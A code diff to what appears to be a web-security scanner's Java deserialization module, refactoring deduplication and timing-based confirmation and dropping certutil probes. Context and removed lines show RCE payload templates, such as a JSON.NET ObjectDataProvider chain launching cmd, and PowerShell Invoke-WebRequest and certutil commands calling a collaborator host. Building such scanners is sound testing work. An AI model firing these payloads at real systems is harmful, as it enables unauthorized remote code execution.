@@ -13,6 +13,7 @@ import com.omnistrike.framework.DeduplicationStore;
 import com.omnistrike.framework.FindingsStore;
 import com.omnistrike.framework.PayloadEncoder;
 import com.omnistrike.framework.ResponseGuard;
+import com.omnistrike.framework.ScanTargetIdentity;
 import com.omnistrike.framework.TimingLock;
 import com.omnistrike.modules.injection.deser.DeserPayloadGenerator;
 
@@ -287,8 +288,7 @@ public class DeserializationScanner implements ScanModule {
 
         for (DeserPoint dp : deserPoints) {
             if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) break;
-            String dedupParam = dp.name + ":" + dp.language;
-            if (!dedup.markIfNew("deser-scanner", urlPath, dedupParam)) continue;
+            if (!dedup.markIfNewRaw("deser-scanner:" + deserTargetKey(request, dp))) continue;
             try {
                 activeTest(requestResponse, dp);
             } catch (InterruptedException e) {
@@ -402,8 +402,7 @@ public class DeserializationScanner implements ScanModule {
         // Test each identified serialization point
         for (DeserPoint dp : deserPoints) {
             if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) break;
-            String dedupParam = dp.name + ":" + dp.language;
-            if (!dedup.markIfNew("deser-scanner", urlPath, dedupParam)) continue;
+            if (!dedup.markIfNewRaw("deser-scanner:" + deserTargetKey(request, dp))) continue;
 
             try {
                 activeTest(requestResponse, dp);
@@ -964,12 +963,13 @@ public class DeserializationScanner implements ScanModule {
         }
 
         // Phase 2: Language-specific active testing (skip if OOB already confirmed)
-        if (oobConfirmedParams.contains(dp.name)) return;
+        String targetKey = deserTargetKey(original.request(), dp);
+        if (oobConfirmedParams.contains(targetKey)) return;
 
         switch (dp.language) {
             case "Java":
                 activeTestJava(original, dp, url);
-                if (oobConfirmedParams.contains(dp.name)) return;
+                if (oobConfirmedParams.contains(targetKey)) return;
                 activeTestJavaSubFrameworks(original, dp, url);
                 break;
             case ".NET":
@@ -977,7 +977,7 @@ public class DeserializationScanner implements ScanModule {
                 break;
             case "PHP":
                 activeTestPhp(original, dp, url);
-                if (oobConfirmedParams.contains(dp.name)) return;
+                if (oobConfirmedParams.contains(targetKey)) return;
                 activeTestPhpFrameworks(original, dp, url);
                 break;
             case "Python":
@@ -993,6 +993,7 @@ public class DeserializationScanner implements ScanModule {
     }
 
     private void activeTestJava(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
+        if (!TimingLock.isEnabled()) return;
         // Try each Java gadget chain
         for (String[] chainInfo : DeserActivePayloads.JAVA_TIME_PAYLOADS) {
             if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
@@ -1012,11 +1013,11 @@ public class DeserializationScanner implements ScanModule {
                 long payloadTime = measureTime(original, dp, payload);
 
                 int threshold = config.getInt("deser.timeThreshold", 14000);
-                if (payloadTime >= baselineTime + threshold) {
+                if (isConfirmedDelay(baselineTime, payloadTime, threshold)) {
                     // Confirm
                     long confirmTime = measureTime(original, dp, payload);
 
-                    if (confirmTime >= baselineTime + threshold) {
+                    if (isConfirmedDelay(baselineTime, confirmTime, threshold)) {
                         findingsStore.addFinding(Finding.builder("deser-scanner",
                                         "Java Deserialization RCE - " + chainName,
                                         Severity.CRITICAL, Confidence.FIRM)
@@ -1134,6 +1135,7 @@ public class DeserializationScanner implements ScanModule {
         }
 
         // Phase 3: Time-based detection for BinaryFormatter chains
+        if (!TimingLock.isEnabled()) return;
         for (String[] chainInfo : DeserActivePayloads.DOTNET_PAYLOADS) {
             if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
             String chainName = chainInfo[0];
@@ -1151,9 +1153,9 @@ public class DeserializationScanner implements ScanModule {
                 long payloadTime = measureTime(original, dp, payload);
 
                 int threshold = config.getInt("deser.timeThreshold", 14000);
-                if (payloadTime >= baselineTime + threshold) {
+                if (isConfirmedDelay(baselineTime, payloadTime, threshold)) {
                     long confirmTime = measureTime(original, dp, payload);
-                    if (confirmTime >= baselineTime + threshold) {
+                    if (isConfirmedDelay(baselineTime, confirmTime, threshold)) {
                         findingsStore.addFinding(Finding.builder("deser-scanner",
                                         ".NET Deserialization RCE (Time-based) - " + chainName,
                                         Severity.CRITICAL, Confidence.FIRM)
@@ -1244,6 +1246,7 @@ public class DeserializationScanner implements ScanModule {
     }
 
     private void activeTestPython(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
+        if (!TimingLock.isEnabled()) return;
         for (String[] payloadInfo : DeserActivePayloads.PYTHON_PAYLOADS) {
             if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
             String desc = payloadInfo[0];
@@ -1261,10 +1264,10 @@ public class DeserializationScanner implements ScanModule {
                 long payloadTime = measureTime(original, dp, payload);
 
                 int threshold = config.getInt("deser.timeThreshold", 14000);
-                if (payloadTime >= baselineTime + threshold) {
+                if (isConfirmedDelay(baselineTime, payloadTime, threshold)) {
                     long confirmTime = measureTime(original, dp, payload);
 
-                    if (confirmTime >= baselineTime + threshold) {
+                    if (isConfirmedDelay(baselineTime, confirmTime, threshold)) {
                         findingsStore.addFinding(Finding.builder("deser-scanner",
                                         "Python Pickle Deserialization RCE",
                                         Severity.CRITICAL, Confidence.FIRM)
@@ -1298,7 +1301,7 @@ public class DeserializationScanner implements ScanModule {
             String payload = payloadInfo[1];
 
             // Time-based detection
-            try {
+            if (TimingLock.isEnabled()) try {
                 TimingLock.acquire();
 
                 long baselineTime = measureTime(original, dp, dp.value);
@@ -1308,9 +1311,9 @@ public class DeserializationScanner implements ScanModule {
                 long payloadTime = measureTime(original, dp, payload);
 
                 int threshold = config.getInt("deser.timeThreshold", 14000);
-                if (payloadTime >= baselineTime + threshold) {
+                if (isConfirmedDelay(baselineTime, payloadTime, threshold)) {
                     long confirmTime = measureTime(original, dp, payload);
-                    if (confirmTime >= baselineTime + threshold) {
+                    if (isConfirmedDelay(baselineTime, confirmTime, threshold)) {
                         findingsStore.addFinding(Finding.builder("deser-scanner",
                                         "Ruby Deserialization RCE - " + desc,
                                         Severity.CRITICAL, Confidence.FIRM)
@@ -1370,7 +1373,7 @@ public class DeserializationScanner implements ScanModule {
             String payload = payloadInfo[1];
 
             // Time-based detection
-            try {
+            if (TimingLock.isEnabled()) try {
                 TimingLock.acquire();
 
                 long baselineTime = measureTime(original, dp, dp.value);
@@ -1380,9 +1383,9 @@ public class DeserializationScanner implements ScanModule {
                 long payloadTime = measureTime(original, dp, payload);
 
                 int threshold = config.getInt("deser.timeThreshold", 14000);
-                if (payloadTime >= baselineTime + threshold) {
+                if (isConfirmedDelay(baselineTime, payloadTime, threshold)) {
                     long confirmTime = measureTime(original, dp, payload);
-                    if (confirmTime >= baselineTime + threshold) {
+                    if (isConfirmedDelay(baselineTime, confirmTime, threshold)) {
                         findingsStore.addFinding(Finding.builder("deser-scanner",
                                         "Node.js Deserialization RCE - " + desc,
                                         Severity.CRITICAL, Confidence.FIRM)
@@ -1602,7 +1605,8 @@ public class DeserializationScanner implements ScanModule {
                 String payloadTemplate = payloadInfo[1];
 
                 AtomicReference<HttpRequestResponse> sentRef = new AtomicReference<>();
-                String collabPayload = registerOobCallback(sentRef, dp, url, "Jackson PTV Bypass " + desc);
+                String collabPayload = registerOobCallback(
+                        sentRef, original.request(), dp, url, "Jackson PTV Bypass " + desc);
                 if (collabPayload == null) continue;
 
                 String payload = collaboratorManager.resolveTemplate(payloadTemplate, collabPayload);
@@ -1781,7 +1785,6 @@ public class DeserializationScanner implements ScanModule {
         if (lang == DeserPayloadGenerator.Language.DOTNET) {
             return new String[][]{
                     {"nslookup COLLAB_PLACEHOLDER", "nslookup"},
-                    {"cmd /c certutil -urlcache -f http://COLLAB_PLACEHOLDER/c", "certutil"},
                     {"powershell -c Invoke-WebRequest http://COLLAB_PLACEHOLDER/ps", "powershell"},
             };
         }
@@ -1799,7 +1802,8 @@ public class DeserializationScanner implements ScanModule {
      * Returns the collaborator payload address, or null if unavailable.
      */
     private String registerOobCallback(AtomicReference<HttpRequestResponse> sentRequest,
-                                        DeserPoint dp, String url, String technique) {
+                                       HttpRequest originalRequest, DeserPoint dp,
+                                       String url, String technique) {
         return collaboratorManager.generatePayload(
                 "deser-scanner", url, dp.name,
                 "Deser OOB " + dp.language + " " + technique,
@@ -1808,7 +1812,7 @@ public class DeserializationScanner implements ScanModule {
                         try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                     }
                     if (interaction.type() == InteractionType.HTTP) {
-                        oobConfirmedParams.add(dp.name);
+                        oobConfirmedParams.add(deserTargetKey(originalRequest, dp));
                     }
                     findingsStore.addFinding(Finding.builder("deser-scanner",
                                     dp.language + " Deserialization RCE (Out-of-Band)",
@@ -1881,7 +1885,8 @@ public class DeserializationScanner implements ScanModule {
                 String technique = chainName + " " + cmdLabel;
 
                 AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
-                String collabPayload = registerOobCallback(sentRequest, dp, url, technique);
+                String collabPayload = registerOobCallback(
+                        sentRequest, original.request(), dp, url, technique);
                 if (collabPayload == null) continue;
 
                 // resolveTemplate handles COLLAB_PLACEHOLDER replacement and
@@ -2010,14 +2015,6 @@ public class DeserializationScanner implements ScanModule {
                                 + "\"$values\":[\"cmd\",\"/c nslookup COLLAB_PLACEHOLDER\"]},"
                                 + "\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\"}}",
                         "JSON.NET ObjectDataProvider nslookup"});
-                // JSON.NET ObjectDataProvider → Process.Start → certutil (Windows-specific DNS)
-                oobTemplateList.add(new String[]{
-                        "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\","
-                                + "\"MethodName\":\"Start\","
-                                + "\"MethodParameters\":{\"$type\":\"System.Collections.ArrayList, mscorlib\","
-                                + "\"$values\":[\"cmd\",\"/c certutil -urlcache -f http://COLLAB_PLACEHOLDER/c\"]},"
-                                + "\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\"}}",
-                        "JSON.NET ObjectDataProvider certutil"});
                 // JSON.NET ObjectDataProvider → PowerShell Invoke-WebRequest
                 oobTemplateList.add(new String[]{
                         "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\","
@@ -2218,7 +2215,8 @@ public class DeserializationScanner implements ScanModule {
             String technique = tmpl[1];
 
             AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
-            String collabPayload = registerOobCallback(sentRequest, dp, url, technique);
+            String collabPayload = registerOobCallback(
+                    sentRequest, original.request(), dp, url, technique);
             if (collabPayload == null) continue;
 
             // resolveTemplate handles COLLAB_PLACEHOLDER replacement +
@@ -2287,7 +2285,9 @@ public class DeserializationScanner implements ScanModule {
                     // For ViewState and raw body injection
                     String body = request.bodyToString();
                     if (body != null && body.contains(dp.value)) {
-                        body = body.replace(dp.value, payload);
+                        int offset = body.indexOf(dp.value);
+                        body = body.substring(0, offset) + payload
+                                + body.substring(offset + dp.value.length());
                     }
                     modified = request.withBody(body != null ? body : payload);
                     break;
@@ -2307,8 +2307,19 @@ public class DeserializationScanner implements ScanModule {
         long start = System.currentTimeMillis();
         HttpRequestResponse result = sendPayload(original, dp, payload);
         long elapsed = System.currentTimeMillis() - start;
-        if (result != null && !ResponseGuard.isTimingTrustworthy(result)) return -1;
+        if (result == null || result.response() == null
+                || !ResponseGuard.isTimingTrustworthy(result)) return -1;
         return elapsed;
+    }
+
+    private static boolean isConfirmedDelay(long baseline, long measured, int threshold) {
+        return baseline >= 0 && measured >= 0 && measured >= baseline + threshold;
+    }
+
+    private static String deserTargetKey(HttpRequest request, DeserPoint dp) {
+        if (request == null) return "unknown:" + dp.location + ":" + dp.name + ":" + dp.language;
+        return ScanTargetIdentity.build(request.url(), request.method(), dp.location,
+                dp.name + ":" + dp.language + ":" + dp.encoding);
     }
 
     private void reportPassiveFinding(List<Finding> findings, String url, String param,
